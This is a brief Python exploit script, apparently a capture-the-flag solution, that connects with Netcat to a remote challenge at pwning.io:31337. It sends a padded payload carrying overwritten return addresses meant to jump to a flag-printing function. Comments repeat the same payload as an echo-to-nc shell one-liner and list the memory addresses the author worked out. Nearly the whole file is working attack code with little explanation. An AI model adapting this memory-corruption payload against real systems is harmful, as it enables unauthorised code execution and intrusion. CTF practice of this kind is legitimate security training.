from nclib.netcat import Netcat

nc = Netcat(("pwning.io", 31337), verbose=True)
#nc = Netcat(("127.0.0.1", 31337), verbose=True)
nc.recv_all(timeout=2)
nc.sendline(b"2")
nc.recv_all(timeout=2)
count = 295
send = b'\x2b\x8e\x04\x08' # Pointer to output flag method
send += b'\xfc\x8a\x04\x08' # Pointer to input string method
payload = ("@.".encode() + ("+" * count).encode() + send)

nc.send(payload)
result = nc.recv_all().decode(errors="ignore")
# For some reason this doesn't work with the remote binary
# just use
#    echo -e echo -e "2\n@.+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++(\x8e\x04\x08\xfc\x8a\x04\x08" | nc pwning.io 31337
# in the commnand line
# no point fixing it now...

'''
if "cheat" in result:
    print("++++++++++++++++++++++++++++++++++++++ HIT +++++++++++++++++++++++++++++++++++++")
    print(result)
    print(payload)
    print("++++++++++++++++++++++++++++++++++++++ HIT +++++++++++++++++++++++++++++++++++++")
'''

# 0x8048e28
# 0x8048e87
# 28 8e 04 80
# \x28\x8e\x04\x08
# 0x8048e2b
# \x2b\x8e\x04\x08

# Saved return pointer
# 0x8048916
# 10 89 04 08

# Then write another return pointer so the program doesn't crash
# 0x804894f the main loop
# 4f 89 04 08
# \x4f\x89\x04\x08

# 0x804887b the main method
# \x7b\x88\x04\x08

# 0x08048afc the input string method
# \xfc\x8a\x04\x08